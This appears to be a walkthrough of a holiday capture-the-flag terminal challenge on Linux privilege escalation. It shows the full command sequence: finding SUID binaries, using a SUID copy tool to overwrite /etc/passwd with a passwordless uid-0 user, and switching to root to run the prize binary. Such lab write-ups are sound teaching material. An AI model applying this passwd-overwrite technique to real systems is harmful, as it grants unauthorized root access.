@@ -1,0 +1,88 @@
+In-game terminal (on Island of Misfit Toys: Scaredy Kite Heights, follow the path northeast of the dock to get to the northern most part of the island to find the Ostrich Saloon)
+Objective: Escalate privileges in the linux terminal.
+Hints:
+  https://payatu.com/blog/a-guide-to-linux-privilege-escalation/
+  Use privileged binary to overwrite a file to escalate privileges or make it easier with crafty arguments.
+  (Good read from google search: become root with etc/passwd) https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
+
+
+(Initial message at startup)
+In a digital winter wonderland we play,
+Where elves and bytes in harmony lay.
+This festive terminal is clear and bright,
+Escalate privileges, and bring forth the light.
+
+Start in the land of bash, where you reside,
+But to win this game, to root you must glide.
+Climb the ladder, permissions to seize,
+Unravel the mystery, with elegance and ease.
+
+There lies a gift, in the root's domain,
+An executable file to run, the prize you'll obtain.
+The game is won, the challenge complete,
+Merry Christmas to all, and to all, a root feat!
+
+* Find a method to escalate privileges inside this terminal and then run the binary in /root *
+
+
+(Of all exploits in the first hint, number 3 to exploit SUID executable looks promising.)
+~$ find / -perm -u=s -type f 2>/dev/null
+  /usr/bin/chfn
+  /usr/bin/chsh
+  /usr/bin/mount
+  /usr/bin/newgrp
+  /usr/bin/su
+  /usr/bin/gpasswd
+  /usr/bin/umount
+  /usr/bin/passwd
+  /usr/bin/simplecopy
+
+
+(https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/)
+(See bonus hack from the link above. We can add a root user without a password with simplecopy. First see how /etc/passwd looks.)
+~$ head -3 /etc/passwd
+  root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+  bin:x:2:2:bin:/bin:/usr/sbin/nologin
+
+
+(Create a file with root2 user having root access and no password.)
+~$ echo root2::0:0:root:/root:/bin/bash > root2
+
+
+(Combine /etc/passwd and ./root2 to make a new passwd file.)
+~$ cat /etc/passwd root2 > passwd
+
+
+(Copy our passwd into /etc/passwd.)
+~$ /usr/bin/simplecopy passwd /etc/passwd
+~$ tail -2 /etc/passwd
+  elf:x:1000:1000::/home/elf:/bin/sh
+  root2::0:0:root:/root:/bin/bash
+
+
+(Switch to root2, go to the /root/ directory, and see what is there.)
+~$ su root2
+~# cd /root/
+~# ls -al
+  total 620
+  drwx------ 1 root root   4096 Dec  2 22:17 .
+  drwxr-xr-x 1 root root   4096 Jan  6 14:33 ..
+  -rw-r--r-- 1 root root   3106 Dec  5  2019 .bashrc
+  -rw-r--r-- 1 root root    161 Dec  5  2019 .profile
+  -rws------ 1 root root 612560 Nov  9 21:29 runmetoanswer
+
+
+(Run the binary. Use santa as the answer.)
+~# ./runmetoanswer
+  Who delivers Christmas presents?
+
+  > santa
+  Your answer: santa
+
+  Checking....
+  Your answer is correct!
+
+
+(Challenge complete. You can now talk to Rose Mold to get a hint about other areas around the island:)
+Not all the areas around Geese Islands have been mapped, and may contain wonderous treasures. Go exploring, hunt for treasure, and find the pirate's booty!
